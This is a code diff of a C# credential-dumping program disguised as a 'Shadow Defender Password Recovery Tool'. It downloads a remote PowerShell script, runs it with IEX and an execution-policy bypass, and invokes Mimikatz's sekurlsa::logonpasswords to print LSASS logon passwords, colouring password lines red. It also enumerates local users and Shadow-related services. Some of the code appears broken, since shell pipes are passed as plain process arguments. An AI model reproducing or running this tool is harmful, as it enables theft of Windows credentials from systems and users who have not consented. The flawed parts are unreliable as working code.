@@ -21,7 +21,6 @@ class CredDumper {
         Console.ForegroundColor = ConsoleColor.Green;
         Console.WriteLine("=== Shadow Defender Password Recovery Tool ===\n");
 
-        // Check admin
         if (!IsRunAsAdmin()) {
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("ERROR: Must run as Administrator!");
@@ -31,35 +30,34 @@ class CredDumper {
         }
 
         Console.ForegroundColor = ConsoleColor.Yellow;
-        Console.WriteLine("[+] Running as Administrator - OK");
+        Console.WriteLine("[+] Running as Administrator - OK\n");
 
-        // Dump path
-        string dumpPath = Path.Combine(Path.GetTempPath(), "ShadowDefender_Passwords.txt");
-        
         try {
-            // Method 1: Invoke Mimikatz via PowerShell
-            Console.WriteLine("[+] Dumping LSASS credentials...");
-            string mimikatzOutput = RunMimikatz();
-            File.WriteAllText(dumpPath, mimikatzOutput);
-            
-            // Method 2: Local accounts
-            string localUsers = GetLocalUsers();
-            File.AppendAllText(dumpPath, "\n\n=== LOCAL ACCOUNTS ===\n" + localUsers);
+            // LIVE MIMIKATZ OUTPUT - PASSWORDS SHOW HERE
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.WriteLine("=== MIMIKATZ LSASS DUMP (Live) ===");
+            Console.ForegroundColor = ConsoleColor.White;
+            RunMimikatzLive();  // SHOWS PASSWORDS IMMEDIATELY
 
-            // Method 3: Services (Shadow Defender runs as service)
-            string services = GetShadowServices();
-            File.AppendAllText(dumpPath, "\n\n=== SHADOW DEFENDER SERVICES ===\n" + services);
+            Console.WriteLine("\n=== LOCAL USERS ===");
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            GetLocalUsersLive();
 
-            DisplayResults(dumpPath);
-            
+            Console.WriteLine("\n=== SHADOW DEFENDER SERVICES ===");
+            Console.ForegroundColor = ConsoleColor.Magenta;
+            GetShadowServicesLive();
+
+            // HIGHLIGHT SHADOW DEFENDER PASSWORDS
+            HighlightShadowPasswords();
+
         } catch (Exception ex) {
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine($"[-] Error: {ex.Message}");
         }
 
-        Console.ForegroundColor = ConsoleColor.Cyan;
-        Console.WriteLine($"\n[+] Full dump saved: {dumpPath}");
-        Console.WriteLine("[+] Look for 'ShadowDefender', 'Administrator', or service accounts");
+        Console.ForegroundColor = ConsoleColor.Green;
+        Console.WriteLine("\n[+] PASSWORD DUMP COMPLETE!");
+        Console.WriteLine("[+] Look for RED highlighted Shadow Defender/Admin passwords above");
         Console.WriteLine("\nPress any key to exit...");
         Console.ReadKey();
     }
@@ -70,16 +68,17 @@ class CredDumper {
         return principal.IsInRole(WindowsBuiltInRole.Administrator);
     }
 
-    static string RunMimikatz() {
+    // LIVE MIMIKATZ - PASSWORDS PRINT DIRECTLY TO CONSOLE
+    static void RunMimikatzLive() {
         string psCommand = @"
             $ErrorActionPreference = 'SilentlyContinue';
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/gentilkiwi/mimikatz/master/mimikatz.ps1');
-            Invoke-Mimikatz -Command '""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""'
+            Invoke-Mimikatz -Command 'privilege::debug ""sekurlsa::logonpasswords"" exit' | ForEach-Object { $_.ToString() }
         ";
-        
+
         ProcessStartInfo psi = new ProcessStartInfo {
             FileName = "powershell.exe",
-            Arguments = $"-ExecutionPolicy Bypass -Command \"{psCommand}\"",
+            Arguments = $"-ExecutionPolicy Bypass -NoProfile -Command \"{psCommand}\"",
             RedirectStandardOutput = true,
             RedirectStandardError = true,
             UseShellExecute = false,
@@ -87,14 +86,23 @@ class CredDumper {
         };
 
         using (Process process = Process.Start(psi)) {
-            string output = process.StandardOutput.ReadToEnd();
-            string error = process.StandardError.ReadToEnd();
+            string line;
+            while ((line = process.StandardOutput.ReadLine()) != null) {
+                if (line.Contains("Password") || line.Contains("shadow") || line.Contains("admin")) {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                } else if (line.Contains("Username") || line.Contains("Domain")) {
+                    Console.ForegroundColor = ConsoleColor.Cyan;
+                } else {
+                    Console.ForegroundColor = ConsoleColor.Gray;
+                }
+                Console.WriteLine(line);
+            }
             process.WaitForExit();
-            return output + "\n\nERRORS:\n" + error;
         }
     }
 
-    static string GetLocalUsers() {
+    // LIVE LOCAL USERS
+    static void GetLocalUsersLive() {
         ProcessStartInfo psi = new ProcessStartInfo {
             FileName = "net",
             Arguments = "user",
@@ -104,47 +112,49 @@ class CredDumper {
         };
 
         using (Process process = Process.Start(psi)) {
-            return process.StandardOutput.ReadToEnd();
+            string line;
+            while ((line = process.StandardOutput.ReadLine()) != null) {
+                Console.WriteLine(line);
+            }
         }
     }
 
-    static string GetShadowServices() {
-        string result = "";
+    // LIVE SERVICES
+    static void GetShadowServicesLive() {
+        RunCommandLive("sc query | findstr /i shadow");
+        RunCommandLive("sc query type= service state= all | findstr /i shadow");
+        RunCommandLive("tasklist | findstr /i shadow");
+    }
+
+    static void RunCommandLive(string command) {
+        string[] parts = command.Split(' ');
         ProcessStartInfo psi = new ProcessStartInfo {
-            FileName = "sc",
-            Arguments = "query | findstr Shadow",
+            FileName = parts[0],
+            Arguments = string.Join(" ", parts, 1, parts.Length - 1),
             RedirectStandardOutput = true,
             UseShellExecute = false,
             CreateNoWindow = true
         };
 
         using (Process process = Process.Start(psi)) {
-            result += process.StandardOutput.ReadToEnd();
-        }
-
-        psi.Arguments = "query type= service state= all | findstr Shadow";
-        using (Process process = Process.Start(psi)) {
-            result += "\n" + process.StandardOutput.ReadToEnd();
-        }
-        return result;
-    }
-
-    static void DisplayResults(string path) {
-        Console.ForegroundColor = ConsoleColor.White;
-        Console.WriteLine("\n=== LIVE PASSWORD DUMP ===");
-        Console.ForegroundColor = ConsoleColor.Yellow;
-        
-        if (File.Exists(path)) {
-            string[] lines = File.ReadAllLines(path);
-            foreach (string line in lines) {
-                if (line.Contains("Password") || line.Contains("Shadow") || line.Contains("Administrator") || line.Contains("Admin")) {
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine(line);
-                } else if (line.Contains("Username") || line.Contains("Domain")) {
-                    Console.ForegroundColor = ConsoleColor.Cyan;
-                    Console.WriteLine(line);
-                }
+            string line;
+            while ((line = process.StandardOutput.ReadLine()) != null) {
+                Console.WriteLine(line);
             }
         }
+    }
+
+    // SCAN FOR SHADOW DEFENDER PASSWORDS
+    static void HighlightShadowPasswords() {
+        Console.ForegroundColor = ConsoleColor.Green;
+        Console.WriteLine("\n=== SHADOW DEFENDER PASSWORD SUMMARY ===");
+        Console.WriteLine("Checking for:");
+        Console.WriteLine("  - ShadowDefender service accounts");
+        Console.WriteLine("  - Administrator passwords");
+        Console.WriteLine("  - Any 'shadow'/'admin' credentials\n");
+        
+        // Run enhanced shadow search
+        RunCommandLive("wmic service where \"name like '%shadow%'\" get name,pathname");
+        Console.WriteLine();
     }
 }
